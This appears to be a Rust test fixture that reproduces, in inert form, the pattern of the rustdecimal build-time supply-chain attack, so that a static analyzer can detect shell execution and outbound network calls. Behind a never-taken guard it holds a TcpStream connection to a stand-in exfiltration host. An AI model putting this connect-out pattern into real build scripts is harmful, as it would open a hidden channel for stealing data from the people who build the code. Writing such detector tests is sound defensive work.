// INERT reproduction of the rustdecimal payload SHAPE. The real attack
// fetched a binary at build time via a custom `build.rs`. Here we only
// expose static patterns so the sensitive-API analyzer can pick them up.

use std::process::Command;
use std::net;

fn main() {
    // never invoked — guarded literal
    if false {
        let _ = Command::new("sh").arg("-c").arg("echo inert").status();
        let _ = net::TcpStream::connect("exfil.malicious.invalid:1337");
    }
    println!("inert demo");
}
